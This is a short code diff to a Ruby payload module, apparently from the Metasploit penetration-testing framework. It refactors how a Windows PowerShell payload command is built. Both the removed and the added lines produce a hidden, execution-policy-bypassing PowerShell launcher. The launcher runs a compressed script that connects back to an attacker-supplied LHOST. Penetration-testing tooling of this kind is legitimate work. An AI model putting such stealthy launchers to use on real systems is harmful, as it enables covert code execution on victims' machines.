@@ -1,8 +1,5 @@
 # -*- coding: binary -*-
 
-require 'msf/core'
-require 'msf/core/payload/windows'
-
 module Msf
 
 ###
@@ -44,7 +41,18 @@ module Payload::Windows::Powershell
     script_in.gsub!('LHOST_REPLACE', lhost.to_s)
 
     script = Rex::Powershell::Command.compress_script(script_in)
-    "powershell.exe -exec bypass -nop -W hidden -noninteractive IEX $(#{script})"
+    command_args = {
+        noprofile: true,
+        windowstyle: 'hidden',
+        noninteractive: true,
+        executionpolicy: 'bypass'
+    }
+    cli =  Rex::Powershell::Command.generate_psh_command_line(command_args)
+    return "#{cli} \"#{script}\""
+  end
+
+  def command_string
+    powershell_command
   end
 end
 end
